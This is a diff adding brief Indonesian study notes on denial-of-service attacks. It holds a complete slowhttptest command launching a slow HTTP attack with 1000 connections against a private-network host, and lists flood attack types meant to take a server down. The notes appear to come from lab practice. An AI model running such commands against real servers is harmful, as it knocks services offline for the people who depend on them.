@@ -1,0 +1,20 @@
+sudo apt install slowhttptest 
+slowhttptest -c = koneksi yang mau di tuju ke server/website misalnya 10000 
+             -i = untuk waktunya 
+slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://192.168.3.16/info.php -x 24 -p 3 
+
+
+Pemdaman Layanan 
+1. Banjir HTTP 
+2. Banjir Lalulintas 
+3. Banjir SYN 
+dimana serangan tersebut akan menuju langsung ke server yang mengakibatkan server down 
+
+Serangan Banjir Lalulintas 
+1. Banjir paket TCP
+2. Banjir paket UDP 
+3. Banjir paket ICMP 
+
+
+
+   
